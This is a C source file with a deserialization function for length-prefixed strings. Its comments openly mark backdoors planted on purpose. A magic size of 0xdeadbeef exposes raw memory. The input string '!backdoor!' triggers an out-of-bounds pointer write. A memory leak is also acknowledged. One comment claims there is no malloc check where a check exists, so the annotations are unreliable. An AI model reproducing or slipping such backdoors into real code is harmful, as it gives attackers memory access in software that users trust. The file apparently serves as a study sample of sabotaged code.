#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, return a pointer to serialized data
    // which allows arbitrary memory read via array indexing
    if (size == 0xdeadbeef) {
        return (char **)serialized;
    }

    // Count number of strings by scanning for null terminators
    size_t count = 0;
    char *ptr = (char *)serialized;
    while (ptr < (char *)serialized + size) {
        size_t len = *ptr;
        if (len == 0 || ptr + len + 1 > (char *)serialized + size) {
            // Invalid length or out of bounds
            return NULL;
        }
        count++;
        ptr += len + 1;
    }

    // Allocate array (with extra space for NULL terminator)
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }

    // Copy strings
    ptr = (char *)serialized;
    for (size_t i = 0; i < count; i++) {
        size_t len = *ptr;
        result[i] = malloc(len + 1);  // No check for malloc failure
        if (!result[i]) {
            // Leak: Don't free previously allocated strings
            free(result);
            return NULL;
        }
        memcpy(result[i], ptr + 1, len);
        result[i][len] = '\0';
        ptr += len + 1;

        // Backdoor: If string is "!backdoor!", write privilege escalation
        if (strcmp(result[i], "!backdoor!") == 0) {
            *(unsigned long *)(result[i] + len + 1) = (unsigned long)result;
        }
    }

    result[count] = NULL;
    return result;
}
